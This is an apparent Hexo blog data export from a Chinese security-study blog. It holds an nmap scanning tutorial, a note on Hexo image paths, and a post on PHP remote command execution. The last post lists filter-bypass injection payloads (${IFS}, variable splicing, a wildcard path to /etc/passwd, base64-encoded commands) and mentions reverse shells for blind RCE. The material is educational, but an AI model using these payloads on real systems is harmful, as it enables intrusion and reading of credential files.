读取文件自动扫描\n\n\n\n假设我们有list.txt文件，文件的内容是ip列表，一行一个。比如这样：\n\n```\n10.73.31.145\n\n10.73.31.116\n```\n\n我们可以输入这条指令让nmap自动扫描：\n\n`nmap -iL list.txt`\n\n\n\n在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键\n","slug":"nmap使用","published":1,"updated":"2022-01-17T07:23:06.225Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mu001ogsw94jiu5byb","content":"<h2 id=\"NMAP\"><a href=\"#NMAP\" class=\"headerlink\" title=\"NMAP\"></a>NMAP</h2><p>nmap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。<span id=\"more\"></span></p>\n<p>其基本功能有四个：</p>\n<p>主机发现（Host Discovery）</p>\n<p>端口扫描（Port Scanning）</p>\n<p>版本侦测（Version Detection）</p>\n<p>操作系统侦测（Operating System Detection）</p>\n<h4 id=\"主机扫描：\"><a href=\"#主机扫描：\" class=\"headerlink\" title=\"主机扫描：\"></a>主机扫描：</h4><p>1)-sL 列表扫描：可以对主机进行反向域名解析,校验ip或域名是否存在</p>\n<p>nmap -sL 192.168.2.0/24或<a href=\"http://www.baidu.com/24\">www.baidu.com/24</a></p>\n<p>2)-sP ping扫描：使用ping主机，得出可响应的主机列表</p>\n<p>nmap -sP 192.168.2.0/24或<a href=\"http://www.baidu.com/24\">www.baidu.com/24</a></p>\n<p>3)-P0 (无ping):高强度的扫描时用它确定正在运行的机器, 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。</p>\n<p>nmap -P0 192.168.8.111</p>\n<p>4)-PS [portlist] (TCP SYN Ping):发送一个设置了SYN标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；</p>\n<p>nmap -PS 192.168.8.118</p>\n<p>5）-PA [portlist] (TCP ACK Ping)：发送一个设置了ACK标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；</p>\n<p>nmap -PA 192.168.8.118</p>\n<p>\\6) -PU [portlist] (UDP Ping):它发送一个空的UDP报文，返回响应报文up以及运行信息，失败返回down；</p>\n<p>nmap -PU 192.168.8.118</p>\n<p>7)-PE; -PP; -PM (ICMP Ping Types):发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。</p>\n<p>nmap -PE 192.168.8.118</p>\n<p>8)-PR (ARP Ping):同一个局域网内，当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。</p>\n<p>nmap -PR 192.168.2.118</p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><p>端口状态：扫描之后，你可能会看到一些端口状态如 open(开放的)，filtered(被过滤的)，closed(关闭的)等等。</p>\n<p>- Open(开放的): 应用程序正在这个端口上监听连接。</p>\n<p>- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n<p>- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n<p>- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n<p>- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n<p>- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n<p>1）-sS (TCP SYN扫描)： 被称为半开放扫描， 因为它不打开一个完全的TCP连接。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。</p>\n<p>nmap -sS 192.168.2.118</p>\n<p>2)-sT (TCP connect()扫描):Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。</p>\n<p>3)-sU (UDP扫描):UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的).</p>\n<p>4)-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描):</p>\n<h5 id=\"nmap端口状态解析\"><a href=\"#nmap端口状态解析\" class=\"headerlink\" title=\"nmap端口状态解析:\"></a>nmap端口状态解析:</h5><p>open ： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 </p>\n<p>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</p>\n<p>filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</p>\n<p>unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</p>\n<p>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</p>\n<p>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</p>\n<p>ping扫描：扫描192.168.0.0/24网段上有哪些主机是存活的；</p>\n<p>nmap -sP 192.168.0.0/24</p>\n<p>端口扫描：扫描192.168.0.3这台主机开放了哪些端口；</p>\n<p>nmap -sT 192.168.0.3</p>\n<p>隐藏扫描，只在目标主机上留下很少的日志信息：隐藏扫描192.168.0.220</p>\n<p>nmap -sS 192.168.0.127</p>\n<p>UDP端口扫描：扫描192.168.0.127开放了哪些UDP端口；</p>\n<p>nmap -sU 192.168.0.127</p>\n<p>操作系统识别：</p>\n<p>nmap -sS -O  192.168.0.127</p>\n<h4 id=\"读取文件自动扫描\"><a href=\"#读取文件自动扫描\" class=\"headerlink\" title=\"读取文件自动扫描\"></a>读取文件自动扫描</h4><p>假设我们有list.txt文件，文件的内容是ip列表，一行一个。比如这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.73.31.145</span><br><span class=\"line\"></span><br><span class=\"line\">10.73.31.116</span><br></pre></td></tr></table></figure>\n\n<p>我们可以输入这条指令让nmap自动扫描：</p>\n<p><code>nmap -iL list.txt</code></p>\n<p>在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"NMAP\"><a href=\"#NMAP\" class=\"headerlink\" title=\"NMAP\"></a>NMAP</h2><p>nmap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。","more":"</p>\n<p>其基本功能有四个：</p>\n<p>主机发现（Host Discovery）</p>\n<p>端口扫描（Port Scanning）</p>\n<p>版本侦测（Version Detection）</p>\n<p>操作系统侦测（Operating System Detection）</p>\n<h4 id=\"主机扫描：\"><a href=\"#主机扫描：\" class=\"headerlink\" title=\"主机扫描：\"></a>主机扫描：</h4><p>1)-sL 列表扫描：可以对主机进行反向域名解析,校验ip或域名是否存在</p>\n<p>nmap -sL 192.168.2.0/24或<a href=\"http://www.baidu.com/24\">www.baidu.com/24</a></p>\n<p>2)-sP ping扫描：使用ping主机，得出可响应的主机列表</p>\n<p>nmap -sP 192.168.2.0/24或<a href=\"http://www.baidu.com/24\">www.baidu.com/24</a></p>\n<p>3)-P0 (无ping):高强度的扫描时用它确定正在运行的机器, 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。</p>\n<p>nmap -P0 192.168.8.111</p>\n<p>4)-PS [portlist] (TCP SYN Ping):发送一个设置了SYN标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；</p>\n<p>nmap -PS 192.168.8.118</p>\n<p>5）-PA [portlist] (TCP ACK Ping)：发送一个设置了ACK标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；</p>\n<p>nmap -PA 192.168.8.118</p>\n<p>\\6) -PU [portlist] (UDP Ping):它发送一个空的UDP报文，返回响应报文up以及运行信息，失败返回down；</p>\n<p>nmap -PU 192.168.8.118</p>\n<p>7)-PE; -PP; -PM (ICMP Ping Types):发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。</p>\n<p>nmap -PE 192.168.8.118</p>\n<p>8)-PR (ARP Ping):同一个局域网内，当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。</p>\n<p>nmap -PR 192.168.2.118</p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><p>端口状态：扫描之后，你可能会看到一些端口状态如 open(开放的)，filtered(被过滤的)，closed(关闭的)等等。</p>\n<p>- Open(开放的): 应用程序正在这个端口上监听连接。</p>\n<p>- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n<p>- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n<p>- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n<p>- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n<p>- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n<p>1）-sS (TCP SYN扫描)： 被称为半开放扫描， 因为它不打开一个完全的TCP连接。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。</p>\n<p>nmap -sS 192.168.2.118</p>\n<p>2)-sT (TCP connect()扫描):Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。</p>\n<p>3)-sU (UDP扫描):UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的).</p>\n<p>4)-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描):</p>\n<h5 id=\"nmap端口状态解析\"><a href=\"#nmap端口状态解析\" class=\"headerlink\" title=\"nmap端口状态解析:\"></a>nmap端口状态解析:</h5><p>open ： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 </p>\n<p>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</p>\n<p>filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</p>\n<p>unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</p>\n<p>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</p>\n<p>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</p>\n<p>ping扫描：扫描192.168.0.0/24网段上有哪些主机是存活的；</p>\n<p>nmap -sP 192.168.0.0/24</p>\n<p>端口扫描：扫描192.168.0.3这台主机开放了哪些端口；</p>\n<p>nmap -sT 192.168.0.3</p>\n<p>隐藏扫描，只在目标主机上留下很少的日志信息：隐藏扫描192.168.0.220</p>\n<p>nmap -sS 192.168.0.127</p>\n<p>UDP端口扫描：扫描192.168.0.127开放了哪些UDP端口；</p>\n<p>nmap -sU 192.168.0.127</p>\n<p>操作系统识别：</p>\n<p>nmap -sS -O  192.168.0.127</p>\n<h4 id=\"读取文件自动扫描\"><a href=\"#读取文件自动扫描\" class=\"headerlink\" title=\"读取文件自动扫描\"></a>读取文件自动扫描</h4><p>假设我们有list.txt文件，文件的内容是ip列表，一行一个。比如这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.73.31.145</span><br><span class=\"line\"></span><br><span class=\"line\">10.73.31.116</span><br></pre></td></tr></table></figure>\n\n<p>我们可以输入这条指令让nmap自动扫描：</p>\n<p><code>nmap -iL list.txt</code></p>\n<p>在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键</p>"},{"title":"hexo上传图片","date":"2021-12-02T09:32:02.000Z","typora-root-url":"..","_content":"\n参考文章:\n\nhttps://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\n\n所有的博客文件保存在_post目录下\n\n<!--more-->\n\n在source下新建一个images文件夹\n\n打开Typora的 文件->偏好设置\n\n![](/images/pic-hexo/image-20211203001406102.png)\n\n这样该文章中的图片都会保存在/source/images/文章名/图片名称\n\n现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置\n\n在typora菜单栏点击 格式->图像->设置图片根目录，将hexo/source作为其根目录。\n\n会在md文件中会自动添加这一段\n\n![](/images/pic-hexo/image-20211202174427901.png)\n\n然后在每次写文章时加上上面这句话,就能保证根目录正确了\n","source":"_posts/pic-hexo.md","raw":"---\ntitle: hexo上传图片\ndate: 2021-12-02 17:32:02\ntags: hexo上传图片\ncategories: hexo\ntypora-root-url: ..\n---\n\n参考文章:\n\nhttps://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\n\n所有的博客文件保存在_post目录下\n\n<!--more-->\n\n在source下新建一个images文件夹\n\n打开Typora的 文件->偏好设置\n\n![](/images/pic-hexo/image-20211203001406102.png)\n\n这样该文章中的图片都会保存在/source/images/文章名/图片名称\n\n现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置\n\n在typora菜单栏点击 格式->图像->设置图片根目录，将hexo/source作为其根目录。\n\n会在md文件中会自动添加这一段\n\n![](/images/pic-hexo/image-20211202174427901.png)\n\n然后在每次写文章时加上上面这句话,就能保证根目录正确了\n","slug":"pic-hexo","published":1,"updated":"2022-01-07T13:31:06.119Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mw001rgsw94izpa0mw","content":"<p>参考文章:</p>\n<p><a href=\"https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\">https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</a></p>\n<p>所有的博客文件保存在_post目录下</p>\n<span id=\"more\"></span>\n\n<p>在source下新建一个images文件夹</p>\n<p>打开Typora的 文件-&gt;偏好设置</p>\n<p><img src=\"/images/pic-hexo/image-20211203001406102.png\"></p>\n<p>这样该文章中的图片都会保存在/source/images/文章名/图片名称</p>\n<p>现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置</p>\n<p>在typora菜单栏点击 格式-&gt;图像-&gt;设置图片根目录，将hexo/source作为其根目录。</p>\n<p>会在md文件中会自动添加这一段</p>\n<p><img src=\"/images/pic-hexo/image-20211202174427901.png\"></p>\n<p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>\n","site":{"data":{}},"excerpt":"<p>参考文章:</p>\n<p><a href=\"https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\">https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</a></p>\n<p>所有的博客文件保存在_post目录下</p>","more":"<p>在source下新建一个images文件夹</p>\n<p>打开Typora的 文件-&gt;偏好设置</p>\n<p><img src=\"/images/pic-hexo/image-20211203001406102.png\"></p>\n<p>这样该文章中的图片都会保存在/source/images/文章名/图片名称</p>\n<p>现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置</p>\n<p>在typora菜单栏点击 格式-&gt;图像-&gt;设置图片根目录，将hexo/source作为其根目录。</p>\n<p>会在md文件中会自动添加这一段</p>\n<p><img src=\"/images/pic-hexo/image-20211202174427901.png\"></p>\n<p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>"},{"title":"rce","date":"2022-01-08T03:08:34.000Z","_content":"\n### PHP常见的命令执行函数和运算符<!--more-->\n\n##### 1.system()函数\n\n用于执行外部程序,并且显示输出\n\nsystem('whoami')\n\nroot\n\n##### 2.exec函数\n\n用于执行一个外部程序, 并不会自动输出,需要加echo\n\necho exec('whoami')\n\nroot\n\n##### 3.shell_exec函数\n\n通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo\n\necho shell_exec('whoami')\n\nroot\n\n##### 4.passthru函数\n\n用于执行外部程序并且显示原始输出\n\npassthru('whoami')\n\nroot\n\n##### 5.popen函数\n\npopen函数用于打开进程文件指针,用法如下:\n\nresource.popen(string $command,string $mode)\n\n例如\n\npopen(\"touch test.txt\",\"r\");执行该代码后,会在当前目录下创建text.txt文件\n\n##### 6.proc_popen\n\n用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版\n\n##### 7.反单引号\n\n反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回\n\n例如\n\necho \\`whoami\\`;\n\nroot\n\n#### Windows下的命令连接符\n\n##### 1)&命令连接符\n\n&前面的语句为假,则直接执行&后面的语句,&前面的语句为真,则&前后的语句都执行\n\n##### 2)&&命令连接符\n\n&&前面的语句为假,则直接报错,&&后面的语句也不执行\n\n##### 3)|命令连接符\n\n|前面的语句为假,则直接报错,|后面的语句也不执行;\n\n|前面的语句为真,则执行|后面的语句\n\n##### 4)||命令连接符\n\n||前面的语句为假,则执行||后面的语句;\n\n||前面的语句为真,则只执行||前面的语句,不执行||后面的语句\n\n#### linux下的命令连接符\n\n##### 1);命令连接符\n\n;使多个命令顺序执行,前面的命令和后面的命令都会执行\n\n##### 2)&命令连接符\n\n&的作用是使命令在后台运行,这样就可以同时执行多条命令\n\nid&whoami前后命令都会执行\n\n##### 3)&&命令连接符\n\n&&的作用是:如果前面的命令执行成功,则执行后面的命令\n\n##### 4)|命令连接符(管道符)\n\n|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.\n\n##### 5||命令连接符\n\n类似于if-else语句,前面执行后面不执行,前面执行失败后面执行\n\n### 命令执行绕过\n\n#### 1.绕过空格过滤\n\n##### 1)${IFS}绕过\n\n$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号\n\n##### 2)$IFS$9绕过\n\n##### 3)制表符绕过\n\n%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤\n\n##### 4){ }绕过\n\n空格过滤可以用{ }绕过,例如\n\n{cat,index.php}\n\n##### 5)<绕过\n\n例如cat<index.php\n\n#### 2.绕过关键字过滤\n\n**利用反引号绕过``包裹的内容在php中会被当成系统命令执行**\n\n \n\n##### 1)变量拼接绕过\n\nlinux支持变量赋值,可以通过变量拼接来绕过过滤规则\n\n例如\n\n$a=c;$b=at;$a$b index.php\n\n##### 2)空变量绕过\n\n例如,可以通过空变量绕过cat命令过滤\n\nca${x}t index.php\n\n##### 3)系统变量绕过\n\n${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤\n\n \n\n##### 4)\\绕过\n\n可以通过c\\a\\t index.php绕过cat命令过滤\n\n##### 5)通配符绕过(简单正则)\n\nlinux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符\n\n通配符规则如下:\n\n- *表示0到多个任意字符\n- ?代表一个任意字符\n- [ ]内为字符范围,代表该字符范围中的任意一个字符\n\n例如对于/etc/passwd可以使用/???/???sw?来绕过\n\n##### 6)shell反弹绕过\n\n##### 7)Base64编码绕过\n\n利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤\n\n```\necho \"aWQ=\"|base64 -d\n```\n\n原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行\n\n##### 8)利用expr和awk绕过\n\n通过expr和awk命令从其他的文件中获取字符并进行命令构造\n\n例如\n\n \n\n##### 9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果\n\n \n\n \n","source":"_posts/rce.md","raw":"---\ntitle: rce\ndate: 2022-01-08 11:08:34\ntags:\n      - RCE\n      - php\ncategories: web\n---\n\n### PHP常见的命令执行函数和运算符<!--more-->\n\n##### 1.system()函数\n\n用于执行外部程序,并且显示输出\n\nsystem('whoami')\n\nroot\n\n##### 2.exec函数\n\n用于执行一个外部程序, 并不会自动输出,需要加echo\n\necho exec('whoami')\n\nroot\n\n##### 3.shell_exec函数\n\n通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo\n\necho shell_exec('whoami')\n\nroot\n\n##### 4.passthru函数\n\n用于执行外部程序并且显示原始输出\n\npassthru('whoami')\n\nroot\n\n##### 5.popen函数\n\npopen函数用于打开进程文件指针,用法如下:\n\nresource.popen(string $command,string $mode)\n\n例如\n\npopen(\"touch test.txt\",\"r\");执行该代码后,会在当前目录下创建text.txt文件\n\n##### 6.proc_popen\n\n用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版\n\n##### 7.反单引号\n\n反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回\n\n例如\n\necho \\`whoami\\`;\n\nroot\n\n#### Windows下的命令连接符\n\n##### 1)&命令连接符\n\n&前面的语句为假,则直接执行&后面的语句,&前面的语句为真,则&前后的语句都执行\n\n##### 2)&&命令连接符\n\n&&前面的语句为假,则直接报错,&&后面的语句也不执行\n\n##### 3)|命令连接符\n\n|前面的语句为假,则直接报错,|后面的语句也不执行;\n\n|前面的语句为真,则执行|后面的语句\n\n##### 4)||命令连接符\n\n||前面的语句为假,则执行||后面的语句;\n\n||前面的语句为真,则只执行||前面的语句,不执行||后面的语句\n\n#### linux下的命令连接符\n\n##### 1);命令连接符\n\n;使多个命令顺序执行,前面的命令和后面的命令都会执行\n\n##### 2)&命令连接符\n\n&的作用是使命令在后台运行,这样就可以同时执行多条命令\n\nid&whoami前后命令都会执行\n\n##### 3)&&命令连接符\n\n&&的作用是:如果前面的命令执行成功,则执行后面的命令\n\n##### 4)|命令连接符(管道符)\n\n|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.\n\n##### 5||命令连接符\n\n类似于if-else语句,前面执行后面不执行,前面执行失败后面执行\n\n### 命令执行绕过\n\n#### 1.绕过空格过滤\n\n##### 1)${IFS}绕过\n\n$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号\n\n##### 2)$IFS$9绕过\n\n##### 3)制表符绕过\n\n%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤\n\n##### 4){ }绕过\n\n空格过滤可以用{ }绕过,例如\n\n{cat,index.php}\n\n##### 5)<绕过\n\n例如cat<index.php\n\n#### 2.绕过关键字过滤\n\n**利用反引号绕过``包裹的内容在php中会被当成系统命令执行**\n\n \n\n##### 1)变量拼接绕过\n\nlinux支持变量赋值,可以通过变量拼接来绕过过滤规则\n\n例如\n\n$a=c;$b=at;$a$b index.php\n\n##### 2)空变量绕过\n\n例如,可以通过空变量绕过cat命令过滤\n\nca${x}t index.php\n\n##### 3)系统变量绕过\n\n${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤\n\n \n\n##### 4)\\绕过\n\n可以通过c\\a\\t index.php绕过cat命令过滤\n\n##### 5)通配符绕过(简单正则)\n\nlinux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符\n\n通配符规则如下:\n\n- *表示0到多个任意字符\n- ?代表一个任意字符\n- [ ]内为字符范围,代表该字符范围中的任意一个字符\n\n例如对于/etc/passwd可以使用/???/???sw?来绕过\n\n##### 6)shell反弹绕过\n\n##### 7)Base64编码绕过\n\n利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤\n\n```\necho \"aWQ=\"|base64 -d\n```\n\n原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行\n\n##### 8)利用expr和awk绕过\n\n通过expr和awk命令从其他的文件中获取字符并进行命令构造\n\n例如\n\n \n\n##### 9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果\n\n \n\n \n","slug":"rce","published":1,"updated":"2022-01-08T03:31:51.156Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9n7001wgsw998ji00qi","content":"<h3 id=\"PHP常见的命令执行函数和运算符\"><a href=\"#PHP常见的命令执行函数和运算符\" class=\"headerlink\" title=\"PHP常见的命令执行函数和运算符\"></a>PHP常见的命令执行函数和运算符<span id=\"more\"></span></h3><h5 id=\"1-system-函数\"><a href=\"#1-system-函数\" class=\"headerlink\" title=\"1.system()函数\"></a>1.system()函数</h5><p>用于执行外部程序,并且显示输出</p>\n<p>system(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"2-exec函数\"><a href=\"#2-exec函数\" class=\"headerlink\" title=\"2.exec函数\"></a>2.exec函数</h5><p>用于执行一个外部程序, 并不会自动输出,需要加echo</p>\n<p>echo exec(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"3-shell-exec函数\"><a href=\"#3-shell-exec函数\" class=\"headerlink\" title=\"3.shell_exec函数\"></a>3.shell_exec函数</h5><p>通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo</p>\n<p>echo shell_exec(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"4-passthru函数\"><a href=\"#4-passthru函数\" class=\"headerlink\" title=\"4.passthru函数\"></a>4.passthru函数</h5><p>用于执行外部程序并且显示原始输出</p>\n<p>passthru(‘whoami’)</p>\n<p>root</p>\n<h5 id=\"5-popen函数\"><a href=\"#5-popen函数\" class=\"headerlink\" title=\"5.popen函数\"></a>5.popen函数</h5><p>popen函数用于打开进程文件指针,用法如下:</p>\n<p>resource.popen(string $command,string $mode)</p>\n<p>例如</p>\n<p>popen(“touch test.txt”,”r”);执行该代码后,会在当前目录下创建text.txt文件</p>\n<h5 id=\"6-proc-popen\"><a href=\"#6-proc-popen\" class=\"headerlink\" title=\"6.proc_popen\"></a>6.proc_popen</h5><p>用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版</p>\n<h5 id=\"7-反单引号\"><a href=\"#7-反单引号\" class=\"headerlink\" title=\"7.反单引号\"></a>7.反单引号</h5><p>反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回</p>\n<p>例如</p>\n<p>echo `whoami`;</p>\n<p>root</p>\n<h4 id=\"Windows下的命令连接符\"><a href=\"#Windows下的命令连接符\" class=\"headerlink\" title=\"Windows下的命令连接符\"></a>Windows下的命令连接符</h4><h5 id=\"1-amp-命令连接符\"><a href=\"#1-amp-命令连接符\" class=\"headerlink\" title=\"1)&amp;命令连接符\"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>\n<h5 id=\"2-amp-amp-命令连接符\"><a href=\"#2-amp-amp-命令连接符\" class=\"headerlink\" title=\"2)&amp;&amp;命令连接符\"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>\n<h5 id=\"3-命令连接符\"><a href=\"#3-命令连接符\" class=\"headerlink\" title=\"3)|命令连接符\"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>\n<p>|前面的语句为真,则执行|后面的语句</p>\n<h5 id=\"4-命令连接符\"><a href=\"#4-命令连接符\" class=\"headerlink\" title=\"4)||命令连接符\"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>\n<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>\n<h4 id=\"linux下的命令连接符\"><a href=\"#linux下的命令连接符\" class=\"headerlink\" title=\"linux下的命令连接符\"></a>linux下的命令连接符</h4><h5 id=\"1-命令连接符\"><a href=\"#1-命令连接符\" class=\"headerlink\" title=\"1);命令连接符\"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>\n<h5 id=\"2-amp-命令连接符\"><a href=\"#2-amp-命令连接符\" 